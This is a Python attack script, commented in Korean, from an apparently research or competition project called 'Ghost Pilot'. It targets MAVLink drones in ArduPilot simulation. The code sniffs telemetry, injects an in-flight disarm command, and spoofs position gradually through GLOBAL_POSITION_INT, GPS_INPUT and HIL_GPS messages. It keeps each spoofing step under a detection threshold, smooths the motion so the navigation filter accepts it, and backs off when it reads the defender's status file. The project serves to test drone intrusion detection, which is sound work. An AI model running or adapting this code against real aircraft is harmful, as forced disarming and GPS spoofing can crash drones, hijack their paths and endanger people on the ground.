"""
attack_agent.py — 공격 에이전트 (Ghost Pilot)
DAH 2026 Ghost Pilot 프로젝트

4가지 공격을 수행한다:
  1. 스니핑 (sniff)       : 정상 텔레메트리 관찰·베이스라인 학습
  2. 명령 인젝션 (inject) : 직접적인 위험 명령 주입 (규칙 기반이 잡는 공격)
  3. 점진적 위조 (ghost)  : 탐지 임계값 아래로 조금씩 위치 조작
                            (규칙 기반은 못 잡고 Isolation Forest만 잡는 공격)
  4. GPS 입력 위조         : SITL에서 GPS_INPUT을 위치 입력으로 주입하는 B안 PoC

Ghost Pilot 시나리오의 핵심은 3/4번이다.
"조금씩" 위조해서 규칙 기반 탐지를 우회하는 것이 이 공격의 목적이다.

사용법:
  python3 attack_agent.py --mode sniff              # 정찰
  python3 attack_agent.py --mode inject             # 직접 명령 주입
  python3 attack_agent.py --mode ghost              # 기존 GLOBAL_POSITION_INT 위조
  python3 attack_agent.py --mode ghost-gps          # GPS_INPUT/HIL_GPS 기반 SITL PoC
  python3 attack_agent.py --mode ghost --adaptive   # 적응형 (탐지되면 속도 감소)
"""

import argparse
from datetime import datetime, timezone
import json
import math
import time

import pymavlink.mavutil as mavutil

from utils import Log, ensure_src_cwd, haversine_m


GPS_EPOCH = datetime(1980, 1, 6, tzinfo=timezone.utc)


def gps_week_time(now=None):
    """현재 UTC 시각을 GPS week / week-ms로 변환한다."""
    now = now or datetime.now(timezone.utc)
    delta = now - GPS_EPOCH
    week = delta.days // 7
    week_ms = int((delta.total_seconds() - week * 7 * 24 * 3600) * 1000)
    return week, week_ms


def offset_latlon_m(lat, lon, north_m, east_m):
    """위도/경도 기준점에서 북/동 방향 meter 오프셋을 더한 좌표를 반환한다."""
    lat_per_m = 1.0 / 111320.0
    cos_lat = max(math.cos(math.radians(lat)), 1e-6)
    lon_per_m = 1.0 / (111320.0 * cos_lat)
    return lat + north_m * lat_per_m, lon + east_m * lon_per_m


def bearing_step_m(step_m, bearing_deg):
    """항공식 bearing(0=N, 90=E)을 north/east meter 성분으로 변환한다."""
    bearing = math.radians(bearing_deg)
    return step_m * math.cos(bearing), step_m * math.sin(bearing)


def slew_toward(current, target, max_delta):
    """Move current toward target by at most max_delta."""
    if target > current:
        return min(target, current + max_delta)
    return max(target, current - max_delta)


def clamp_vector(north, east, max_norm):
    """Clamp a north/east vector to max_norm while keeping its bearing."""
    norm = math.sqrt(north * north + east * east)
    if norm <= max_norm or norm <= 1e-9:
        return north, east
    scale = max_norm / norm
    return north * scale, east * scale


class GhostPilotAttack:
    def __init__(self, target="udp:127.0.0.1:14550"):
        Log.info(f"공격 에이전트 시작. 대상: {target}")
        self.conn = mavutil.mavlink_connection(target)
        self.conn.wait_heartbeat()
        self.sys_id = self.conn.target_system
        self.comp_id = self.conn.target_component
        Log.attack(f"타깃 확보! SYS_ID={self.sys_id}")
        self.request_position_stream()

        self.baseline = {}
        self.spoof_delta = 0.0      # 누적 위조량 (도 단위)
        self.spoof_step = 0.00001   # 한 스텝당 위조량 (약 1.1m)

    def request_position_stream(self, hz=2):
        """직접 SITL TCP 연결에서도 위치 텔레메트리가 나오도록 요청한다."""
        try:
            msg_id = getattr(mavutil.mavlink, "MAVLINK_MSG_ID_GLOBAL_POSITION_INT", 33)
            cmd = getattr(mavutil.mavlink, "MAV_CMD_SET_MESSAGE_INTERVAL", 511)
            self.conn.mav.command_long_send(
                self.sys_id,
                self.comp_id,
                cmd,
                0,
                msg_id,
                int(1_000_000 / max(hz, 1)),
                0, 0, 0, 0, 0,
            )
        except Exception:
            pass

        try:
            stream_id = getattr(mavutil.mavlink, "MAV_DATA_STREAM_POSITION", 6)
            self.conn.mav.request_data_stream_send(
                self.sys_id,
                self.comp_id,
                stream_id,
                int(hz),
                1,
            )
        except Exception:
            pass

    # ──────────────────────────────────────────────────────────
    # Phase 1: 스니핑 — 정상 패턴 관찰·학습
    # ──────────────────────────────────────────────────────────
    def sniff(self, duration=30):
        """정상 텔레메트리를 관찰하고 베이스라인을 학습한다."""
        Log.attack(f"[Phase 1] 스니핑 시작 ({duration}초)")
        samples = []
        start = time.time()

        while time.time() - start < duration:
            msg = self.conn.recv_match(
                type=["GLOBAL_POSITION_INT", "VFR_HUD"],
                blocking=True, timeout=2
            )
            if msg is None:
                continue

            if msg.get_type() == "GLOBAL_POSITION_INT":
                lat = msg.lat / 1e7
                lon = msg.lon / 1e7
                alt = msg.alt / 1000.0
                samples.append((lat, lon, alt))
                Log.attack(
                    f"  관찰: lat={lat:.6f} lon={lon:.6f} alt={alt:.1f}m"
                )

        if samples:
            self.baseline["lat"] = samples[-1][0]
            self.baseline["lon"] = samples[-1][1]
            self.baseline["alt"] = sum(s[2] for s in samples) / len(samples)
            Log.attack(
                f"[Phase 1] 베이스라인 학습 완료: "
                f"기준위치=({self.baseline['lat']:.6f}, {self.baseline['lon']:.6f}), "
                f"평균고도={self.baseline['alt']:.1f}m"
            )
        else:
            Log.alert("샘플 수집 실패. SITL에서 드론이 떠 있는지 확인하세요.")
        return self.baseline

    # ──────────────────────────────────────────────────────────
    # Phase 2-A: 직접 명령 인젝션 (규칙 기반이 잡는 공격)
    # ──────────────────────────────────────────────────────────
    def inject_command(self, command_id=400, param1=0):
        """
        위험 명령을 직접 주입한다.
        command_id=400: MAV_CMD_COMPONENT_ARM_DISARM (param1=0이면 강제 정지)
        command_id=176: MAV_CMD_DO_SET_MODE
        command_id=21 : MAV_CMD_NAV_LAND

        이 공격은 '알 수 없는 SYS_ID' 또는 '비행 중 위험 명령'으로
        규칙 기반 방어(Layer 1)에 탐지된다.
        """
        Log.attack(f"[Phase 2-A] 명령 인젝션: command_id={command_id}")
        self.conn.mav.command_long_send(
            self.sys_id, self.comp_id,
            command_id,
            0,                  # confirmation
            param1, 0, 0, 0, 0, 0, 0
        )
        Log.attack(f"  → 명령 전송 완료 (param1={param1})")

    # ──────────────────────────────────────────────────────────
    # Phase 2-B: 점진적 위조 (Ghost Pilot 핵심 — Layer 1은 못 잡음)
    # ──────────────────────────────────────────────────────────
    def ghost_spoof(self, iterations=100, interval=0.5, adaptive=False,
                    feedback_fn=None):
        """
        탐지 임계값 바로 아래로 위치를 조금씩 위조한다.

        한 번에 spoof_step(약 1m)씩만 이동시키므로,
        '위치 순간이동(111m 이상)' 규칙에 걸리지 않는다.
        이 legacy 엔진은 GLOBAL_POSITION_INT를 직접 송신한다. SITL에서는
        FC의 GPS/항법 입력으로 반영되지 않는 한계가 확인된 비교용 경로다.

        adaptive=True: 방어가 탐지하면 속도를 절반으로 줄인다 (살아있는 판단).
        feedback_fn: 방어 탐지 여부를 반환하는 콜백 (통합 시연용).
        """
        if not self.baseline:
            Log.alert("베이스라인이 없습니다. 먼저 sniff()를 실행하세요.")
            self.sniff(duration=15)

        Log.attack(f"[Phase 2-B] 점진적 위조 시작 (Ghost Pilot 핵심 공격)")
        Log.attack(f"  스텝당 이동: {self.spoof_step * 111000:.1f}m "
                   f"(규칙 임계값 111m보다 작음 → Layer 1 우회)")

        base_lat = self.baseline["lat"]
        base_lon = self.baseline["lon"]
        base_alt = self.baseline["alt"]

        for i in range(iterations):
            self.spoof_delta += self.spoof_step
            fake_lat = int((base_lat + self.spoof_delta) * 1e7)
            fake_lon = int((base_lon + self.spoof_delta) * 1e7)

            # 위조된 GLOBAL_POSITION_INT 전송
            # (고도·속도는 정상값 유지 → 더 자연스럽게 보임)
            self.conn.mav.global_position_int_send(
                int(time.time() * 1000) % (2**32),   # time_boot_ms (uint32 랩어라운드)
                fake_lat, fake_lon,
                int(base_alt * 1000),      # alt (mm)
                0,                          # relative_alt
                0, 0, 0,                    # vx, vy, vz
                0                           # hdg
            )

            total_drift = self.spoof_delta * 111000
            Log.attack(
                f"  [{i+1}/{iterations}] 위조 주입: "
                f"누적 이탈={total_drift:.1f}m  스텝={self.spoof_step*111000:.2f}m"
            )

            # 적응형: 방어 탐지 여부 확인 후 속도 조절
            if adaptive and feedback_fn is not None:
                if feedback_fn():
                    self.spoof_step *= 0.5
                    Log.attack(f"  ⚠ 방어 탐지 감지 → 위조 속도 절반으로 감소 "
                               f"({self.spoof_step*111000:.2f}m)")
                else:
                    self.spoof_step = min(self.spoof_step * 1.05, 0.00002)

            time.sleep(interval)

        Log.attack(f"[Phase 2-B] 위조 완료. 총 이탈량 {self.spoof_delta*111000:.1f}m")

    # ──────────────────────────────────────────────────────────
    # Phase 2-C: GPS_INPUT 기반 SITL PoC (B안)
    # ──────────────────────────────────────────────────────────
    def set_mavlink_gps_type(self, gps_type=14):
        """
        ArduPilot SITL이 MAVLink GPS 입력을 쓰도록 GPS 타입 파라미터를 설정한다.
        ArduPilot 4.x는 GPS1_TYPE, 일부 구버전은 GPS_TYPE을 사용한다.
        """
        Log.attack("[Setup] MAVLink GPS 입력 사용 파라미터 설정 시도")
        for param in ("GPS1_TYPE", "GPS_TYPE"):
            self._set_param(param, float(gps_type))

    def _set_param(self, name, value, timeout=2.0):
        param_type = getattr(mavutil.mavlink, "MAV_PARAM_TYPE_REAL32", 9)
        self.conn.mav.param_set_send(
            self.sys_id,
            self.comp_id,
            name.encode("ascii"),
            float(value),
            param_type,
        )

        deadline = time.time() + timeout
        while time.time() < deadline:
            msg = self.conn.recv_match(type="PARAM_VALUE", blocking=True, timeout=0.2)
            if msg is None:
                continue
            pid = getattr(msg, "param_id", "")
            if isinstance(pid, bytes):
                pid = pid.decode("ascii", "ignore")
            if pid.strip("\x00") == name:
                Log.attack(f"  {name}={msg.param_value:g} 확인")
                return True

        Log.alert(f"  {name} 응답 없음. SITL 콘솔에서 직접 설정해야 할 수 있음")
        return False

    def _send_gps_input(self, lat, lon, alt_m, vn, ve, vd, gps_id=0,
                        fix_type=3, satellites=12, hacc=0.6, vacc=1.0,
                        sacc=0.2, hdop=0.8, vdop=1.2):
        """
        MAVLink GPS_INPUT을 송신한다.
        GLOBAL_POSITION_INT와 달리 이 메시지는 FC가 MAVLink GPS로 설정된 경우
        GPS 센서 입력으로 처리할 수 있는 경로다.
        """
        week, week_ms = gps_week_time()
        time_usec = int(time.time() * 1_000_000)
        ignore_flags = 0
        lat_i = int(lat * 1e7)
        lon_i = int(lon * 1e7)

        args = (
            time_usec, gps_id, ignore_flags, week_ms, week, fix_type,
            lat_i, lon_i, float(alt_m), float(hdop), float(vdop),
            float(vn), float(ve), float(vd),
            float(sacc), float(hacc), float(vacc), int(satellites),
        )

        self.conn.mav.gps_input_send(*args)

    def _send_hil_gps(self, lat, lon, alt_m, vn, ve, vd, fix_type=3,
                      satellites=12, hacc=0.6, vacc=1.0):
        """
        MAVLink HIL_GPS를 송신한다.
        ArduPilot/PX4 HIL 구성에서 raw GPS 입력으로 쓰이는 후보 경로다.
        """
        time_usec = int(time.time() * 1_000_000)
        lat_i = int(lat * 1e7)
        lon_i = int(lon * 1e7)
        alt_mm = int(alt_m * 1000)
        eph_cm = int(hacc * 100)
        epv_cm = int(vacc * 100)
        vn_cms = int(vn * 100)
        ve_cms = int(ve * 100)
        vd_cms = int(vd * 100)
        vel_cms = int(math.sqrt(vn ** 2 + ve ** 2 + vd ** 2) * 100)
        cog_cdeg = int((math.degrees(math.atan2(ve, vn)) % 360.0) * 100)
        self.conn.mav.hil_gps_send(
            time_usec, fix_type, lat_i, lon_i, alt_mm, eph_cm, epv_cm,
            vel_cms, vn_cms, ve_cms, vd_cms, cog_cdeg, int(satellites),
        )

    def _observe_global_position(self, timeout=0.25):
        msg = self.conn.recv_match(
            type="GLOBAL_POSITION_INT",
            blocking=True,
            timeout=timeout,
        )
        if msg is None:
            return None
        return msg.lat / 1e7, msg.lon / 1e7, msg.alt / 1000.0

    def ghost_gps_input(self, iterations=100, interval=0.5, step_m=1.0,
                        bearing_deg=45.0, adaptive=False, feedback_fn=None,
                        gps_id=0, fix_type=3, satellites=12, hacc=0.6,
                        vacc=1.0, sacc=0.2, verify=False,
                        gps_engine="gps-input", warmup_sec=3.0,
                        consistency_profile="linear", max_accel=0.6,
                        max_speed=3.0):
        """
        GPS_INPUT 기반 Ghost Pilot PoC.

        기존 GLOBAL_POSITION_INT 단독 송신과 달리, 이 경로는 SITL에서 FC가
        MAVLink GPS 입력으로 설정되어 있을 때 항법 입력으로 반영되는지 검증한다.
        """
        if not self.baseline:
            Log.alert("베이스라인이 없습니다. 먼저 sniff()를 실행하세요.")
            self.sniff(duration=15)
        if not self.baseline:
            Log.alert("베이스라인 확보 실패. GPS_INPUT PoC를 중단합니다.")
            return

        base_lat = self.baseline["lat"]
        base_lon = self.baseline["lon"]
        base_alt = self.baseline["alt"]

        current_step_m = step_m
        north_total = 0.0
        east_total = 0.0
        vn_state = 0.0
        ve_state = 0.0

        Log.attack(f"[Phase 2-C] {gps_engine} 기반 점진적 위조 시작")
        Log.attack(
            f"  step={step_m:.2f}m interval={interval:.2f}s "
            f"bearing={bearing_deg:.1f}deg gps_id={gps_id}"
        )

        if warmup_sec > 0:
            self._warmup_gps_input(
                base_lat, base_lon, base_alt,
                seconds=warmup_sec,
                interval=min(interval, 0.25),
                gps_engine=gps_engine,
                gps_id=gps_id,
                fix_type=fix_type,
                satellites=satellites,
                hacc=hacc,
                vacc=vacc,
                sacc=sacc,
            )

        reflected = 0
        observed = 0
        for i in range(iterations):
            if consistency_profile == "ekf-smooth":
                desired_speed = current_step_m / max(interval, 1e-3)
                desired_vn, desired_ve = bearing_step_m(desired_speed, bearing_deg)
                dv = max_accel * max(interval, 1e-3)
                vn_state = slew_toward(vn_state, desired_vn, dv)
                ve_state = slew_toward(ve_state, desired_ve, dv)
                vn_state, ve_state = clamp_vector(vn_state, ve_state, max_speed)
                vn = vn_state
                ve = ve_state
                north_step = vn * interval
                east_step = ve * interval
            else:
                north_step, east_step = bearing_step_m(current_step_m, bearing_deg)
                vn = north_step / max(interval, 1e-3)
                ve = east_step / max(interval, 1e-3)

            north_total += north_step
            east_total += east_step

            fake_lat, fake_lon = offset_latlon_m(
                base_lat, base_lon, north_total, east_total)

            if gps_engine == "hil-gps":
                self._send_hil_gps(
                    fake_lat, fake_lon, base_alt, vn, ve, 0.0,
                    fix_type=fix_type, satellites=satellites,
                    hacc=hacc, vacc=vacc,
                )
            else:
                self._send_gps_input(
                    fake_lat, fake_lon, base_alt, vn, ve, 0.0,
                    gps_id=gps_id, fix_type=fix_type, satellites=satellites,
                    hacc=hacc, vacc=vacc, sacc=sacc,
                )

            target_drift = haversine_m(base_lat, base_lon, fake_lat, fake_lon)
            msg = (
                f"  [{i+1}/{iterations}] {gps_engine} 주입: "
                f"목표누적={target_drift:.1f}m "
                f"lat={fake_lat:.7f} lon={fake_lon:.7f}"
            )

            if verify:
                pos = self._observe_global_position(timeout=min(interval, 0.3))
                if pos is not None:
                    observed += 1
                    obs_lat, obs_lon, _ = pos
                    official_drift = haversine_m(base_lat, base_lon, obs_lat, obs_lon)
                    error_m = haversine_m(fake_lat, fake_lon, obs_lat, obs_lon)
                    min_drift = max(0.5, target_drift * 0.4)
                    max_error = max(2.0, target_drift * 0.75)
                    reflected_now = (
                        official_drift >= min_drift and error_m <= max_error
                    )
                    if reflected_now:
                        reflected += 1
                    msg += (
                        f" | 공식텔레메트리 drift={official_drift:.1f}m "
                        f"target_err={error_m:.1f}m "
                        f"reflected={int(reflected_now)}"
                    )
                else:
                    msg += " | 공식텔레메트리 관측 없음"

            Log.attack(msg)

            if adaptive and feedback_fn is not None:
                if feedback_fn():
                    current_step_m *= 0.5
                    Log.attack(f"  방어 반응 감지 → GPS_INPUT step 감소 ({current_step_m:.2f}m)")
                else:
                    current_step_m = min(current_step_m * 1.05, step_m * 2.0)

            time.sleep(interval)

        total_drift = haversine_m(
            base_lat, base_lon,
            *offset_latlon_m(base_lat, base_lon, north_total, east_total),
        )
        Log.attack(f"[Phase 2-C] {gps_engine} 위조 완료. 목표 총 이탈량 {total_drift:.1f}m")
        if verify:
            Log.info(f"[{gps_engine} 반영 관측] observed={observed} reflected={reflected}")

    def _warmup_gps_input(self, lat, lon, alt_m, seconds, interval,
                          gps_engine, gps_id, fix_type, satellites,
                          hacc, vacc, sacc):
        """
        MAVLink GPS로 입력원을 바꾼 직후 EKF가 기준 GPS fix를 볼 수 있도록
        drift 없는 정상 위치 샘플을 먼저 흘린다.
        """
        count = max(1, int(seconds / max(interval, 1e-3)))
        Log.attack(f"  기준 {gps_engine} warmup: {seconds:.1f}s ({count} samples)")
        for _ in range(count):
            if gps_engine == "hil-gps":
                self._send_hil_gps(
                    lat, lon, alt_m, 0.0, 0.0, 0.0,
                    fix_type=fix_type, satellites=satellites,
                    hacc=hacc, vacc=vacc,
                )
            else:
                self._send_gps_input(
                    lat, lon, alt_m, 0.0, 0.0, 0.0,
                    gps_id=gps_id, fix_type=fix_type,
                    satellites=satellites, hacc=hacc,
                    vacc=vacc, sacc=sacc,
                )
            self._observe_global_position(timeout=0.02)
            time.sleep(interval)

    # ──────────────────────────────────────────────────────────
    # 적응형 폐루프: 방어 상태 파일을 읽어 탐지 여부를 반환
    # ──────────────────────────────────────────────────────────
    def make_feedback_fn(self, status_path, max_age=5.0):
        """
        방어 에이전트가 기록한 상태 파일을 읽어 '지금 방어가 반응 중인가'를
        True/False로 돌려주는 콜백을 생성한다. ghost_spoof(adaptive=True)에
        넘기면, 방어가 탐지하는 순간 공격이 위조 속도를 낮춘다(백오프).

        max_age: 상태가 이 시간(초)보다 오래되면 무시(신선한 탐지만 신뢰).
        """
        def feedback():
            try:
                with open(status_path) as f:
                    st = json.load(f)
            except (OSError, ValueError):
                return False   # 아직 방어 상태가 없음 → 미탐지로 간주
            if time.time() - st.get("ts", 0) > max_age:
                return False   # 오래된 상태는 신뢰하지 않음
            return bool(st.get("detecting", False))
        return feedback


def main():
    ensure_src_cwd()
    parser = argparse.ArgumentParser(description="Ghost Pilot 공격 에이전트")
    parser.add_argument("--target", default="udp:127.0.0.1:14550")
    parser.add_argument("--mode", choices=["sniff", "inject", "ghost", "ghost-gps"],
                        default="sniff")
    parser.add_argument("--adaptive", action="store_true",
                        help="점진적 위조 시 적응형 모드 (방어 탐지 시 백오프)")
    parser.add_argument("--feedback-file", default="../results/defense_status.json",
                        help="방어 상태 공유 파일 경로 (--adaptive 시 읽음)")
    parser.add_argument("--iterations", type=int, default=100)
    parser.add_argument("--interval", type=float, default=0.5)
    parser.add_argument("--step-m", type=float, default=1.0,
                        help="ghost-gps에서 한 스텝당 누적할 위치 편향(m)")
    parser.add_argument("--bearing-deg", type=float, default=45.0,
                        help="ghost-gps 이동 방향. 0=N, 90=E")
    parser.add_argument("--gps-id", type=int, default=0)
    parser.add_argument("--gps-engine", choices=["gps-input", "hil-gps"],
                        default="gps-input",
                        help="ghost-gps 주입 엔진. ArduPilot 기본 PoC는 gps-input 권장")
    parser.add_argument("--fix-type", type=int, default=3,
                        help="GPS fix type. 3=3D fix")
    parser.add_argument("--satellites", type=int, default=12)
    parser.add_argument("--hacc", type=float, default=0.6,
                        help="수평 정확도(m)")
    parser.add_argument("--vacc", type=float, default=1.0,
                        help="수직 정확도(m)")
    parser.add_argument("--sacc", type=float, default=0.2,
                        help="속도 정확도(m/s)")
    parser.add_argument("--consistency-profile",
                        choices=["linear", "ekf-smooth"],
                        default="linear",
                        help="ghost-gps kinematic profile")
    parser.add_argument("--max-accel", type=float, default=0.6,
                        help="ekf-smooth max horizontal acceleration in m/s^2")
    parser.add_argument("--max-speed", type=float, default=3.0,
                        help="ekf-smooth max horizontal speed in m/s")
    parser.add_argument("--set-gps-type", action="store_true",
                        help="SITL에서 GPS1_TYPE/GPS_TYPE=14(MAVLink) 설정 시도")
    parser.add_argument("--verify", action="store_true",
                        help="주입 후 공식 GLOBAL_POSITION_INT 반영 여부 관측")
    parser.add_argument("--warmup-sec", type=float, default=3.0,
                        help="ghost-gps 시작 전 기준 GPS_INPUT 샘플 주입 시간")
    parser.add_argument("--baseline-lat", type=float, default=None,
                        help="ghost-gps 수동 기준 위도")
    parser.add_argument("--baseline-lon", type=float, default=None,
                        help="ghost-gps 수동 기준 경도")
    parser.add_argument("--baseline-alt", type=float, default=None,
                        help="ghost-gps 수동 기준 고도(m)")
    args = parser.parse_args()

    attacker = GhostPilotAttack(args.target)

    if args.mode == "sniff":
        attacker.sniff(duration=30)

    elif args.mode == "inject":
        attacker.sniff(duration=10)
        # 비행 중 모터 강제 정지 시도 (규칙 기반이 차단해야 함)
        attacker.inject_command(command_id=400, param1=0)

    elif args.mode == "ghost":
        attacker.sniff(duration=15)
        # 적응형이면 방어 상태 파일을 감시하는 피드백 콜백을 연결한다.
        feedback_fn = None
        if args.adaptive:
            feedback_fn = attacker.make_feedback_fn(args.feedback_file)
            Log.attack(f"적응형 폐루프 활성화 — 방어 상태 감시: {args.feedback_file}")
        attacker.ghost_spoof(
            iterations=args.iterations,
            interval=args.interval,
            adaptive=args.adaptive,
            feedback_fn=feedback_fn,
        )

    elif args.mode == "ghost-gps":
        manual_baseline = (
            args.baseline_lat is not None and
            args.baseline_lon is not None and
            args.baseline_alt is not None
        )
        if manual_baseline:
            attacker.baseline = {
                "lat": args.baseline_lat,
                "lon": args.baseline_lon,
                "alt": args.baseline_alt,
            }
            Log.attack(
                "수동 베이스라인 사용: "
                f"lat={args.baseline_lat:.7f} "
                f"lon={args.baseline_lon:.7f} alt={args.baseline_alt:.1f}m"
            )
        else:
            attacker.sniff(duration=15)
        if args.set_gps_type:
            attacker.set_mavlink_gps_type()
        feedback_fn = None
        if args.adaptive:
            feedback_fn = attacker.make_feedback_fn(args.feedback_file)
            Log.attack(f"적응형 폐루프 활성화 — 방어 상태 감시: {args.feedback_file}")
        attacker.ghost_gps_input(
            iterations=args.iterations,
            interval=args.interval,
            step_m=args.step_m,
            bearing_deg=args.bearing_deg,
            adaptive=args.adaptive,
            feedback_fn=feedback_fn,
            gps_id=args.gps_id,
            gps_engine=args.gps_engine,
            fix_type=args.fix_type,
            satellites=args.satellites,
            hacc=args.hacc,
            vacc=args.vacc,
            sacc=args.sacc,
            verify=args.verify,
            warmup_sec=args.warmup_sec,
            consistency_profile=args.consistency_profile,
            max_accel=args.max_accel,
            max_speed=args.max_speed,
        )


if __name__ == "__main__":
    main()
